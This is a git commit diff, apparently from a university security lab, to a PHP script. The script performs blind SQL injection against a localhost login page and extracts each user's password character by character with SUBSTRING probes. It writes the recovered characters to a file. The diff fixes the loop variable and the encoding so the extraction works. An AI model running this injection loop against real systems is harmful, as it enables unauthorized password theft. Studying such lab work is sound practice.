033fec0c4a9f2601b2126df259751bcf25011688
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-18 20:25:45 +0200

    test

--- script.php
+++ script.php
@@ -89,8 +89,8 @@ for($id = 1; $id <= 100; $id++){
 
 	$letter = "";
 	for ($i = 1; $i <= $sizepwd; $i++) {
-		foreach (range(38,127) as $x){
-			$letter = utf8_encode(chr($character));
+		foreach (range(33,127) as $character){
+			$letter = chr($character);
 			if($letter == '+'){
 				$letter = "%2B";
 			}
@@ -98,14 +98,14 @@ for($id = 1; $id <= 100; $id++){
 			//$letter = mb_convert_encoding (chr($character), 'UTF-8', 'ISO-8859-1');
          	//echo "$letter \n";
 
-			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(password,$i,1)%20=%20%27%$character%27%20--%20";
+			$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%20$id%20and%20SUBSTRING(password,$i,1)%20=%20%27$letter%27%20--%20";
 			$result = file_get_contents($url);
 			if (strpos($result, 'cat') !== false) {
 				if ($letter == "%2B") {
 					$letter = "+";
 				}
-				print "$character";
-				fputs($monfichier, $character);
+				print "$letter";
+				fputs($monfichier, $letter);
 				break;
 			}else{
 
